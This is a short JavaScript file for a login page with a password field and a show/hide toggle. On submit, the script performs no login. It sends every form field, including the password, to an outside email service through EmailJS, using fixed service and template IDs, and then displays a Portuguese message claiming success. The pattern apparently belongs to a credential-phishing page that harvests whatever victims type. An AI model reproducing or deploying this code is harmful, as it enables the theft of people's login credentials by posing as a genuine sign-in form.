// script.js

const form = document.getElementById("login-form");
const btn = document.getElementById("button");
const status = document.getElementById("status");
const passwordToggle = document.getElementById("toggle-password");
const passwordField = document.getElementById("password");

form.addEventListener("submit", function(event) {
  event.preventDefault();
  btn.value = "Sending...";

  emailjs.sendForm("service_p7w5khg", "template_vpjavws", this)
    .then(() => {
      btn.value = "Send";
      status.innerText = "✅ Obrigado, confirmado com sucesso...";
      form.reset();
    }, (err) => {
      btn.value = "Send";
      status.innerText = "❌ Failed to send. " + JSON.stringify(err);
    });
});

// Toggle password visibility
passwordToggle.addEventListener("click", () => {
  const isPassword = passwordField.type === "password";
  passwordField.type = isPassword ? "text" : "password";
  passwordToggle.textContent = isPassword ? "🙈" : "👁";
});

